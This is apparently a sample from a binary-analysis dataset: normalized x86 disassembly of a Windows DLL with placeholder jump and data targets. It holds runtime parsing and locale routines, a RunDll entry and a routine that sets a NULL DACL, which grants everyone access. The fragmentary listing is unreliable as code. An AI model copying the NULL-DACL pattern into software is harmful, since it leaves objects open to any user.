lea eax [ ebp + 0xc ]
push eax
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
lea edi [ ebx + 0x10 ]
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x8 ]
call sub_1004d254
or [ esi ] eax
add esp 0x18
dec [ edi ]
mov edi [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x2
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004d1f2
jmp r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004d254
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f06e
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10048504
cmp [ ebp - 0x4 ] 0x4
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jne r-xdata
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ebp + 0x11 ] 0x20
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
or [ esi ] 0x2
jmp r-xdata
cmp [ ebp + 0x10 ] al
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f06e
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
je r-xdata
cmp [ ebp + 0x11 ] 0x30
jl r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp + 0x11 ] 0x2c
je r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
lea edi [ ebx + 0x10 ]
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x8 ]
call sub_1004d254
or [ esi ] eax
add esp 0x18
dec [ edi ]
mov edi [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
or [ esi ] 0x1
cmp [ ebp - 0x4 ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
lea eax [ ebx + 0xc ]
push eax
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004d254
add esp 0x18
or [ esi ] eax
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10048504
cmp [ ebp + 0x11 ] 0x39
jg r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp + 0x11 ] 0x2f
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_1003f092
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x4 ] 0x3
jne r-xdata
lea edi [ ebx + 0x10 ]
push edi
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x8 ]
call sub_1004d254
or [ esi ] eax
add esp 0x18
dec [ edi ]
jmp r-xdata
push ebx
push esi
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
mov ecx edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1004d1f2
jmp r-xdata
add ebx 0xc
push ebx
push 0x1f
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push edi
call sub_1004d254
add esp 0x18
or [ esi ] eax
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
sub_1004d88b
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1004d254
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
test [ ecx ] 0x2
jne r-xdata
mov edx 0x76c
cmp [ ebp - 0x4 ] edx
jl r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
mov eax [ ebp + 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x87
jle r-xdata
sub [ ebp - 0x4 ] edx
jmp r-xdata
or eax 0x2
mov [ ecx ] eax
sub_1004d8f9
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003f234
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1004d939
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003f234
add esp 0x10
test eax eax
jge r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1004d979
push 0x98
mov eax sub_1004f917
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x5
pop eax
call sub_1002b37e
retn
cmp [ eax ] edi
jne r-xdata
push 0x1c
call sub_1002738b
pop ecx
mov [ ebp - 0x14 ] eax
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_1000792f
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100078da
mov ecx [ ebp - 0x14 ]
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1004d1bf
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000794c
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
sub_1004da23
push 0x14
mov eax sub_1004ef29
call sub_1002b2a6
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_10021e84
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007573
mov ecx [ ebp + 0x8 ]
push eax
call sub_100075a8
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10021eac
mov eax edi
call sub_1002b37e
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004d979
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007d44
push edi
call sub_10022081
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100274f1
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002ae74
sub_1004dac0
push 0x4
mov eax sub_1004f953
call sub_1002b2a6
xor edi edi
mov [ ebp - 0x10 ] edi
mov ebx [ ebp + 0xc ]
test bl 0x1
je r-xdata
test bl 0x20
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
and ebx 0x4
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004bc76
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004bd13
pop ecx
push eax
push 0x8
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1004b1ed
mov esi eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
and ebx 0x10
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004bdb0
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
mov [ eax + 0x4 ] edi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004be4d
pop ecx
push eax
push 0x10
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1004b255
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
call sub_1002b37e
retn
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004da23
pop ecx
push eax
push 0x1c
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1d
cmp ecx edi
je r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1004b278
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004c024
pop ecx
push eax
push 0x14
call sub_1002738b
pop ecx
cmp eax edi
je r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
call sub_1004d1bf
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004beea
pop ecx
push eax
push 0x34
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x11
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
cmp ebx edi
je r-xdata
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push [ ebp + 0x8 ]
mov ecx eax
call sub_1004b2dd
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] edi
jne r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_1004b584
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
mov ecx rw-data
call sub_10007573
push eax
push [ ebp + 0x14 ]
call sub_1004bf87
pop ecx
push eax
push 0x34
call sub_1002738b
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x17
cmp ecx edi
je r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
cmp ebx edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
xor esi esi
push edi
push edi
push [ ebp + 0x8 ]
call sub_1004b5d0
mov esi eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_100247b0
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10007573
push eax
push esi
jmp r-xdata
sub_1004dd9b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ebx [ eax ]
mov eax [ eax + 0x4 ]
call sub_1002d957
mov ebx [ eax + 0x4 ]
call sub_1002d931
jmp r-xdata
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_1003e804
add esp 0x20
test eax eax
jne r-xdata
cmp esi edi
mov eax esi
jl r-xdata
test ebx ebx
jne r-xdata
dec eax
dec eax
call sub_1002d4db
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10027c61
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp esi edi
je r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_1004de44
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
mov [ ebp - 0x4 ] 0x0
lea edi [ ebp - 0x3 ]
stosb [ edi ]
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push 0x22
call sub_1002d957
push [ eax + 0x14 ]
call [ GetLocaleInfoA@IAT ]
cmp [ ebp - 0x4 ] 0x30
pop edi
jne r-xdata
xor eax eax
cmp [ ebp - 0x4 ] 0x31
jne r-xdata
push 0x2
pop eax
leave
retn
cmp [ ebp - 0x4 ] 0x32
setne al
dec eax
and eax 0x3
leave
retn
inc eax
leave
retn
sub_1004de8f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
sar esi 0x1
sar edi 0x1
test eax eax
jne r-xdata
mov ebx [ eax ]
call sub_1002d957
mov ebx [ eax + 0x4 ]
jmp r-xdata
call sub_1002d931
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_1004e0e2
add esp 0x20
test eax eax
jne r-xdata
cmp esi edi
mov edx esi
jl r-xdata
test ebx ebx
jne r-xdata
dec eax
dec eax
call sub_1002d4db
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
pop edi
pop esi
pop ebx
pop ebp
retn
test edx edx
jg r-xdata
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
xor eax eax
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jmp r-xdata
inc eax
inc eax
inc ecx
inc ecx
dec edx
cmp esi edi
je r-xdata
test eax eax
jne r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_1004df3d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
sub edi [ ebp + 0x8 ]
sar esi 0x1
sar edi 0x1
or ebx 0xffffffff
test eax eax
jne r-xdata
mov eax [ eax ]
call sub_1002d957
mov eax [ eax + 0x4 ]
jmp r-xdata
push edi
call sub_1002ddb0
pop ecx
mov [ ebp + 0x14 ] eax
test eax eax
je r-xdata
cmp esi edi
ja r-xdata
mov [ ebp + 0xc ] eax
test eax eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
call sub_1002d931
push eax
push edi
push [ ebp + 0x14 ]
mov edi 0x400
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push 0x0
call sub_1002e0ff
mov ebx eax
add esp 0x20
test ebx ebx
jne r-xdata
mov ebx esi
jmp r-xdata
lea eax [ esi + esi ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002a0f0
add esp 0xc
xor eax eax
test ebx ebx
jbe r-xdata
call sub_1002d931
push eax
xor eax eax
push eax
push eax
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push eax
call sub_1002e0ff
mov ebx eax
add esp 0x20
test ebx ebx
jne r-xdata
push [ ebp + 0x14 ]
call sub_10027a85
pop ecx
mov ecx [ ebp + 0x14 ]
movzx cx [ eax + ecx ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 2 ] cx
inc eax
cmp eax ebx
jb r-xdata
mov ebx 0x7fffffff
jmp r-xdata
sub_1004e016
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov ebx [ ebp + 0xc ]
sub ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
sub esi [ ebp + 0x10 ]
push edi
xor edi edi
cmp eax edi
jne r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
call sub_1002d957
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
call sub_1002d931
jmp r-xdata
push 0x1
push [ ebp + 0xc ]
push edi
push edi
push esi
push [ ebp + 0x10 ]
mov edi 0x400
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_1002dd42
add esp 0x24
test eax eax
je r-xdata
cmp eax edi
jne r-xdata
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp eax ebx
mov [ ebp - 0x4 ] eax
jg r-xdata
cmp esi ebx
ja r-xdata
push 0x1
push [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x14 ]
push 0x0
call sub_1002dd42
add esp 0x24
mov [ ebp - 0x4 ] esi
jmp r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002a0f0
add esp 0xc
sub_1004e0c2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
jne r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
dec ecx
mov eax [ ebp + 0x8 ]
sub eax ecx
dec eax
pop ebp
retn
inc eax
inc eax
sub_1004e0e2
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov esi [ ebp + 0x18 ]
mov edx [ ebp + 0x20 ]
test esi esi
jle r-xdata
test edx edx
jle r-xdata
mov eax [ ebp + 0x14 ]
push esi
call sub_1004e0c2
pop ecx
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x1c ]
push edx
call sub_1004e0c2
pop ecx
mov edx eax
sub esi edx
jne r-xdata
test edx edx
je r-xdata
xor eax eax
test esi esi
setge al
lea eax [ eax + eax + 0x1 ]
push 0x2
pop eax
jmp r-xdata
push edx
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ CompareStringW@IAT ]
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
sub_100534f4
push esi
push 0x1
mov esi rw-data
push esi
call [ InitializeSecurityDescriptor@IAT ]
test eax eax
je r-xdata
pop esi
retn
push 0x0
push 0x0
push 0x1
push esi
call [ SetSecurityDescriptorDacl@IAT ]
test eax eax
je r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] esi
mov [ rw-data ] 0xc
mov [ rw-data ] 0x0
sub_100536b0
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
pop esi
retn
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
mov ecx esi
pop esi
jmp edx
sub_100536f0
push ecx
push edi
mov edi [ rw-data ]
test edi edi
je r-xdata
pop edi
pop ecx
retn
push 0x0
lea ecx [ esp + 0x8 ]
call sub_10021e84
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
push esi
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ esp + 0x8 ]
and esi edi
call sub_10021eac
test esi esi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
pop esi
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_100011b9
push [ rw-data ]
call sub_10014945
xor eax eax
retn 0x4
runDll
call sub_1000b702
jmp RunDllEntry
sub_1000141f
mov esi [ ebp + 0x8 ]
call sub_100015ca
xor ebx ebx
push ebx
push ebx
call sub_1002ae74
int3
sub_10001431
push esi
mov esi eax
call sub_100015ca
push [ esi ]
call sub_100272e8
pop ecx
pop esi
retn
sub_10001b56
push 0x8
mov eax sub_10050615
call sub_1002b2a6
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
call sub_1002b37e
retn
push [ ebp + 0x8 ]
call sub_100025cf
sub_10001c4e
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001c66
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10001cd5
push esi
mov esi ecx
call sub_10001cf1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10001cf1
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_100020e2
mov ecx esi
pop esi
jmp sub_100274ce
sub_10001d0e
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001cf1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10001d30
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001ca0
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10001d84
movsx eax [ esp + 0xc ]
push [ esp + 0x8 ]
push eax
push [ esp + 0xc ]
call sub_10027650
add esp 0xc
retn
sub_10001d9b
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_100020e2
mov ecx esi
pop esi
jmp sub_100274ce
sub_10001ede
cmp [ ecx + 0x24 ] 0x10
jb r-xdata
lea eax [ ecx + 0x10 ]
retn
mov eax [ ecx + 0x10 ]
retn
sub_10001f21
push 0x0
push 0x1
call sub_100020e2
retn
sub_100020cd
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_100020e2
push esi
push esi
call sub_1002ae74
int3
sub_1000218b
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100272f3
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_1000227b
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
call sub_100275d0
add esp 0x10
retn
j_sub_1000229a
jmp sub_1000229a
sub_1000233b
push esi
lea eax [ esp + 0x8 ]
push eax
mov esi ecx
call sub_10027401
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10002354
mov [ ecx ] r--data
jmp sub_100274ce
sub_1000235f
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100274ce
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10002381
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10027471
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_100024b8
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_1000264e
push esi
push esi
call sub_1002ae74
int3
sub_1000252e
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
retn
mov eax [ ecx + 0x4 ]
retn
sub_100025f5
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
add eax eax
push eax
push [ esp + 0x10 ]
call sub_100272f3
add esp 0x10
retn
sub_10002614
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100025f5
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_10002cf0
mov eax r-xdata
retn
sub_1000327f
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
retn
sub_100037cc
mov eax [ esi ]
test eax eax
je r-xdata
call sub_10027827
cmp eax [ edi ]
je r-xdata
mov eax [ esi + 0x4 ]
xor ecx ecx
cmp eax [ edi + 0x4 ]
setne cl
mov al cl
retn
sub_100037e9
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_10002793
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10003839
push esi
mov esi ecx
call sub_100032aa
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10003855
push 0xffffffff
push 0x0
push [ esp + 0xc ]
call sub_100021c3
retn 0x4
sub_10004901
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10004a31
push esi
mov esi ecx
push 0x0
